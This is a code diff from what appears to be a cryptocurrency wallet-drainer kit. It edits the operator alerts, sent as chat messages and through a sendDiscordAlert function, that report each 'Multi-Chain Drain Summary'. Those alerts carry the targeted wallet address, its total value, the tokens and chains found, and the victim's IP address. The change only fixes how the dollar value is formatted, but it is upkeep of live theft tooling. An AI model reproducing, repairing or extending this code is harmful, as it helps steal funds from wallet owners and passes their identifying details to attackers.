@@ -2709,7 +2709,7 @@ ${data.assets.map(asset => `   • ${asset.symbol}: ${asset.balance} ($${asset.v
 🌐 <b>Multi-Chain Drain Summary</b>
 
 👤 <b>Target:</b> <code>${data.walletAddress}</code>
-💰 <b>Total Value:</b> $${data.totalValue?.toFixed(2) || '0'}
+💰 <b>Total Value:</b> $${Number(data.totalValue || 0).toFixed(2)}
 🪙 <b>Tokens Found:</b> ${data.tokenCount}
 🔗 <b>Blockchain Breakdown:</b>
 ${Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `   • ${chain.toUpperCase()}: ${count} tokens`).join('\n')}
@@ -2723,7 +2723,7 @@ ${Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `   •
 📊 <b>Wallet Analysis Complete</b>
 
 👤 <b>Target:</b> <code>${data.walletAddress}</code>
-💰 <b>Total Value:</b> $${data.totalValue?.toFixed(2) || '0'}
+💰 <b>Total Value:</b> $${Number(data.totalValue || 0).toFixed(2)}
 🪙 <b>Tokens Found:</b> ${data.tokenCount}
 🔗 <b>Blockchain Breakdown:</b>
 ${Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `   • ${chain.toUpperCase()}: ${count} tokens`).join('\n')}
@@ -2870,7 +2870,7 @@ async function sendDiscordAlert(type, data) {
                     .setColor('#00ff88')
                     .addFields(
                         { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
-                        { name: 'Total Value', value: `$${data.totalValue?.toFixed(2) || '0'}`, inline: true },
+                        { name: 'Total Value', value: `$${Number(data.totalValue || 0).toFixed(2)}`, inline: true },
                         { name: 'Tokens Found', value: `${data.tokenCount}`, inline: true },
                         { name: 'Blockchain Breakdown', value: Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `• ${chain.toUpperCase()}: ${count} tokens`).join('\n'), inline: false },
                         { name: 'IP Address', value: data.visitorInfo?.ip || 'Unknown', inline: true }
@@ -2884,7 +2884,7 @@ async function sendDiscordAlert(type, data) {
                     .setColor('#8888ff')
                     .addFields(
                         { name: 'Target Wallet', value: `\`${data.walletAddress}\``, inline: false },
-                        { name: 'Total Value', value: `$${data.totalValue?.toFixed(2) || '0'}`, inline: true },
+                        { name: 'Total Value', value: `$${Number(data.totalValue || 0).toFixed(2)}`, inline: true },
                         { name: 'Tokens Found', value: `${data.tokenCount}`, inline: true },
                         { name: 'Blockchain Breakdown', value: Object.entries(data.blockchainBreakdown || {}).map(([chain, count]) => `• ${chain.toUpperCase()}: ${count} tokens`).join('\n'), inline: false },
                         { name: 'Status', value: data.message || 'Analysis completed', inline: true },
